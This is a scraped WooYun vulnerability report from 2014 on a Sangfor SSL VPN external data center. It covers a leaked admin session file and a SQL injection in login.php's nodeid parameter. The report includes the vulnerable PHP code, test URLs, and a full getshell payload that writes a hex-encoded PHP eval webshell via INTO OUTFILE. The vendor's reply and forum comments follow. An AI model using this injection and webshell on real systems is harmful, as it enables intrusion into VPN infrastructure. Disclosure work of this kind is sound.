{"id": 1475, "wybug_id": "wooyun-2014-064698", "wybug_title": "深信服SSL VPN外置数据中心敏感信息泄漏&amp;SQL注入漏洞可导致getshell", "wybug_corp": "深信服", "wybug_author": "f4ckbaidu", "wybug_date": "2014-06-12 20:01", "wybug_open_date": "2014-09-10 20:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析", "泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-10：\t细节向公众公开  简要描述： 测试版本为SSL 5.7的外置DC，主要有两个问题:1、管理员sessionid泄漏2、SQL注入 详细说明：  一、敏感信息泄漏：Admin用户登录后，会出现一个文件（Admin未登录时此文件不存在）里面包含了Admin用户的phpsessionid，并且任意用户可访问，如下图：https://192.168.222.128/global_admin.ini\n\n利用方法类似XSS，其它用户将浏览器cookie phpsessionid改成对应的值，再访问/src/index.php就是管理员用户了，无需知道帐号密码利用fiddler把phpsessionid改成Admin对应的sessionid：\n\n再访问/src/index.php，直接登录了：\n\n系统设置--环境设置--其它，可以看到服务器绝对路径：\n\n二、SQL注入/src/login.php代码审核：\nif(isset($_REQUEST['action_c'])&&$_REQUEST['action_c'] == 'login'){\theader(\"Content-type: text/html; charset=utf-8\");\t$user_type = $_REQUEST['user_type'];\t$user = $_REQUEST['user'];\t$pass = $_REQUEST['pass'];\t$pass_dec = base64_decode($pass);\t$nodeid = $_REQUEST['nodeid'];        //nodeid参数输入部分，未做过滤\tif(!empty($nodeid) && !is_numeric($nodeid) && !is_numeric($user_type))    //这部分逻辑搞笑了，当nodeid不为空且nodeid不为数字且user_type不为数字才返回参数错误。当user_type为数字型，而nodeid不为数字型的时候，这里逻辑为假，不提示参数错误并进入后续代码处理\t{\t\tbackmsg(\"参数错误\");\t\texit;\t}\tif($user_type != 0)\t{\t\t$user_type = 1;\t}\t// 封锁IP检测\t$path = $_SERVER['DOCUMENT_ROOT'].\"/src/temp\";\t$handle = @opendir($path);\tif($handle)\t{\t\twhile(false !== ($file_name = @readdir($handle)))\t\t{\t\t\t$file = $path.\"/\".$file_name;\t\t\tif(time() - @filemtime($file) > 300)  //300秒后清除IP黑名单文件\t\t\t{\t\t\t\t@unlink($file);\t\t\t}\t\t}\t}\t$time = 0;\t$file = $path.\"/\".$_SERVER['REMOTE_ADDR'].$user_type;\t$handle = @fopen($file, \"r\");\tif($handle)\t{\t\t$time = @fread($handle, 10);\t\tif(($time !== false) && ($time > 4))\t\t{\t\t\tbackmsg('同一IP登录登录失败次数超过5次，拒绝登录，请稍后再试');\t\t\texit;\t\t}\t\t@fclose($handle);\t}\t$handle = @fopen($file, \"w\");\tif($handle)\t{\t\t++$time;\t\t@fwrite($handle, $time);\t\t@fclose($handle);\t}    //上面的封锁逻辑，当用户登录失败5次后，封锁300秒\t//验证用户名密码\t$adlogin = new adtLogin($user_type);\tif(!$adlogin->checkAdtPsw($nodeid,$user,$pass_dec))  //验证帐号密码流程，需跟踪\t{\t\tbackmsg(_E($adlogin->geterrno()));\t\texit;\t}\t// 通过验证，删除临时文件\t@unlink($file);\nphp class adtLogin代码文件：/src/inc/class/adtLogin.class.php\nclass adtLogin  {\tvar $Gloadmin=1;//记录是否是全局管理员，0表示全局管理员，1表示节点管理员 存入session\tvar $type;//记录用户选择管理员类型 0表示全局管理员，1表示节点管理员\tvar $errno;\tvar $nodeid;\tfunction adtLogin($type)\t{\t\t$this->type=trim($type);\t}\tpublic function checkAdtPsw($nodeid,$username,$pass)\t{\t/*@参数：$nodeid 数值 客户端提交数据，0表示用户选择全局数据库，其他值对应相应节点ID\t\t$this->nodeid=trim($nodeid);  //nodeid未过滤\t\t$username=filterStr(trim($username));\t\t$pass = @EncryptDes2(filterStr($pass));\t\t//$pass =md5($pass);\t\t$con=new SinforDbBase();\t\t\t\tif($this->type==0)  //type=0也就是全局管理员的检查流程，这里没有问题，不用看\t\t{   　　省略......\t\t}\t\telse  //type=1也就是节点管理员的检查流程\t\t{\t\t\tif($nodeid == null)\t\t\t{\t\t\t\t$this->errno=50;\t\t\t\treturn false;\t\t\t}\t\t\tif(!$con->OpenDb($this->nodeid))  //变量nodeid进入OpenDb函数，需跟踪\t\t\t{\t\t\t\t$this->errno=50;\t\t\t\treturn false;\t\t\t}省略......\nOpenDb函数定义在/src/inc/class/SinforDbBase.class.php里\n　　省略......        function OpenDb($NodeId=GLOBAL_DB)  //需跟踪的OpenDb函数        {            $db_config[\"hostname\"]  = $this->hostname.\":\".$this->port;            $db_config[\"username\"]  = $this->username;            $db_config[\"password\"]  = $this->pass;            $db_config[\"charset\"]   = \"UTF8\";            $db_config[\"database\"]  = _S(\"DatabaseConfig\", \"DataBase\"); // 默认为全局数据库                        if( $NodeId != GLOBAL_DB )  //触发注入的前提，也就是nodeid不为0            {                //$dbObj  = new DBMantain();                //$db_config[\"database\"] = $dbObj->getdbname($NodeId);                /* 取数据库名字 */                if( ! $this->connect($db_config) )                {                    return false;                }                                $sql = \"select DB_Name from dev_node where id =$NodeId\";  //SQL注入点                $row = $this -> row_query_one($sql);                $this -> close_db();                   if( ! $row )                {                    return false;                }                $db_config[\"database\"] = $row[\"DB_Name\"];   // 非全局数据库            }\n注入POC：https://IP/src/login.php?action_c=login&user_type=1g&user=admin&pass=admin&nodeid=3 and 1=1提示“用户名或密码不正确”https://IP/src/login.php?action_c=login&user_type=1g&user=admin&pass=admin&nodeid=3 and 1=2提示“连接数据库失败”由于有防爆破登录机制，这里用sqlmap注入会有很大麻烦，需要很长时间由于mysql用户是root，并且magic_quotes_gpc = Off，系统又是windows，呵呵了，直接getshell：https://IP/src/login.php?action_c=login&user_type=1&user=admin&pass=admin&nodeid=3 union select  0x3c3f70687020406576616c28245f504f53545b277362275d293b3f3e into outfile 'C:\\Program Files\\Sangfor\\SSL\\LogKeeper\\htdocs\\test.php'生成一句话，密码sb，访问地址：https://IP/test.php具体路径可以利用上面的管理员session泄漏漏洞登录系统后获取\n\n   漏洞证明：  getshell:\n\n   修复方案：  1、修正那搞笑的逻辑2、对参数做严格检查。比如intval   版权声明：转载请注明来源 f4ckbaidu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-06-13 14:14 厂商回复： 首先感谢白帽子对深信服产品提出的建议，经内部验证，有3点需要向您说明：1、SSL VPN外置的数据中心主要存放VPN的相关日志，用于给管理员进行分析，对于SSL VPN的安全性影响较低；2、SSL VPN的外置数据中心用户量较少，大部分功能都已经在SSL VPN设备上实现，只有少数用户会使用外置数据中心；3、SSL VPN的数据中心部署于内网。基于以上三点原因，我们将漏洞级别降低为中级。同时，我们已经启动应急程序，会对数据中心安装包的安全性进行严格的审查和改善，尽快发布新版安装包。 另外，工作人员已经私信给您，请留下联系方式，后续我们会寄出小礼物来对您表示感谢。 (^_^)    首先感谢白帽子对深信服产品提出的建议，经内部验证：1、SSL VPN外置的数据中心主要存放VPN的操作日志，用于给管理员进行分析，不涉及到SSL VPN的权限安全问题，.....2、SSL VPN的外置数据中心用量较小，大部分功能都已经在SSL VPN设备上实现，只有少数用户会使用外置数据中心；3、SSL VPN的数据中心主要部署于内网，基于以上三点原因，我们将漏洞级别降低为中级。我们已经启动应急程序，会对数据中心安装包的安全性进行严格的审查和改善，尽快发布新版安装包。 另外，工作人员已经私信给您，请留下联系方式，后续我们会寄出小礼物来表示对您的感谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-13 00:16 |    \t\t小森森 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 不中二 枉少年)\t\t \n  关注……    \n     2014-06-13 08:54 |    \t\tkgra \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:3        | 一波还未平息，一波洞又来袭)\t\t \n  这种东西一般都是内网的吧?洞主咋搞的？    \n     2014-06-13 10:42 |    \t\t小森森 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 不中二 枉少年)\t\t \n  @kgra 貌似比较常见的一种用途是提供给外网的，能访问内网资源的vpn。。高校们很多都在用    \n     2014-06-13 14:02 |    \t\t大狮子 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 学习，分享，进步)\t\t \n  @小森森 使用外置DC的不多，外置DC允许外网访问的更少    \n     2014-06-13 14:18 |    \t\t深信服(乌云厂商)\t\t \n  抱歉~  由于操作失误，部分冗余信息未删除，请大家见谅~~    \n     2014-06-13 14:37 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  @kgra 外网也不少呢    \n     2014-06-13 15:01 |    \t\t小森森 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 不中二 枉少年)\t\t \n  @大狮子 额……是外置数据中心啊……之前没看到抱歉    \n     2014-06-28 15:37 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  描述部分有问题，我提交了N次修改，也PM了，怎么没人理？    \n     2014-07-02 21:36 |    \t\thacker@sina.cn \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:27        | ANONYMOUS)\t\t \n  惊现洞主一只    \n     2014-07-05 15:49 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  牛逼啊，为何路人甲    \n     2014-08-11 15:45 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  @疯狗，提现一周了，咋还没到帐呢。。。    \n     2014-09-11 20:51 |    \t\twellsun \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | www.wellsun.com)\t\t \n  诚心诚信RMB收购乌云币~ 价格加Q谈：7520024 （加者备注）    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}